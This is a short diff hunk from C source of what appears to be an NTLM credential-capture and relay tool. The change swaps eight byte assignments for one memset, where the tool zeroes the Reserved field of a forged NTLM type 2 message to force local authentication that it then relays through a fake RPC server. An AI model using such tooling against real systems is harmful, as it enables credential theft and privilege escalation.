@@ -58,14 +58,7 @@ void DoRpcServerCaptureCredsHash(wchar_t* rpcServerIp, wchar_t* rpcServerPort, w
 			// forge the ntlm type2 message using the win32 api
 			ForgeNtlmType2(ntlmType1, iResult - ntlmIndex, ntlmType2, &ntlmType2Len);
 			// here we zero'd out the Reserved field to force a remote authentication on localhost. If this value is not set to 0 the auth will be broken.
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +1] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +2] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +3] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +4] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +5] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +6] = 0;
-			ntlmType2[NTLMv2_TYPE2_RESERVED_OFFSET +7] = 0;
+			memset(ntlmType2 + NTLMv2_TYPE2_RESERVED_OFFSET, 0, 8);
 			// here we communicate with our fake RPC Server to have just the template for rpc packets, sending the type1
 			if (send(RPCSocketReflect, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
 				printf("[!] Couldn't communicate with the fake RPC Server\n");
